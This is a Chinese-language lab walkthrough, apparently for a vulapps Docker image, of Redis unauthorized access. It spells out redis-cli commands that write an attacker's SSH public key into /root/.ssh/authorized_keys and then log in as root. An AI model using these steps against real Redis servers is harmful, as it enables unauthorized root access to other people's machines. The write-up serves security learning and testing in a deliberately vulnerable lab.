Redis 未授权访问漏洞
---

### 漏洞信息

> antirez :
> 
>  From time to time I get security reports about Redis. It’s good to get reports, but it’s odd that what I get is usually about things like Lua sandbox escaping, insecure temporary file creation, and similar issues, in a software which is designed (as we explain in our security page here http://redis.io/topics/security) to be totally insecure if exposed to the outside world.
> 
>我时不时的会收到有关Redis的安全报告, 这些报告多是有关 Lua沙盒溢出或是不安全的写文件这种千篇一律的问题, 但是这对一个被设计成一旦暴露在外部网络中就毫无安全性可言的软件来说简直是太奇怪了, 因为他们本来就不该暴露在外部网络之中 : (
>

如果将 Redis 绑定在 0.0.0.0:6379，会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。

攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行 redis 的用户是 root 用户，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接登录目标服务器。

### 镜像信息

类型 | 值
:-:|:-:|:-:
redis 端口 | 6379
redis 密码 | 无
sshd 端口 | 22
ssh root 密码 | 未设置(自行通过漏洞登录)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:r_redis_1
 ```

2. 启动环境

 ```
$ docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1
 ```
 > `-p 22:22` 前面的 22 代表物理机的端口，可随意指定。
 >

3. 检测是否启动

 使用 redis-cli 连接 redis 显示成功则代表服务已经启动


### 利用步骤

1. 在攻击方生成一对 ssh key (如果已经生成过则可跳过此步骤)

 ```
  $ ssh-keygen -t rsa
 ```
 
 默认情况下，生成后在用户的家目录下的 .ssh 目录下
 
2. 将生成的公钥的值写入目标服务器

 ```
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/foo.txt
 $ cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set crackit
 ```
 
 > 加上 `\n\n` 是为了不破坏 ssh public key
 > 
 > crackit 是设置的 key，可随意指定

3. 连接目标

 ```
 $ redis-cli -h 192.168.1.100 -p 6379
192.168.1.100:6379> config set dir /root/.ssh/
OK
192.168.1.100:6379> config get dir
1) "dir"
2) "/root/.ssh"
192.168.1.100:6379> config set dbfilename "authorized_keys"
OK
192.168.1.100:6379> save
OK
 ```
 
 将目录设置为 /root/.ssh/ 目录后，再将备份文件名设置为 `authorized_keys`，通过 save 指令即可写入文件。

4. 通过 ssh 连接目标

 ```
 $ ssh root@192.168.1.100 -i ~/.ssh/id_rsa
 ```
 > 默认会使用 `id_rsa` 如果改过文件名则可以用 -i 参数来指定。

### 推荐阅读

* [A few things about Redis security -- antirez](http://antirez.com/news/96)
* [Trying to hack Redis via HTTP requests](https://www.secpulse.com/archives/5366.html)
* [Redis 未授权访问检测](http://www.bugscan.net/source/plugin/2360/template/)
* [Redis 未授权访问缺陷可轻易导致系统被黑](https://www.seebug.org/vuldb/ssvid-89715)

### 扩展阅读

> ssh 不仅支持密码登录，还支持证书登录

* [authorized_keys 文件说明](http://man.he.net/man5/authorized_keys)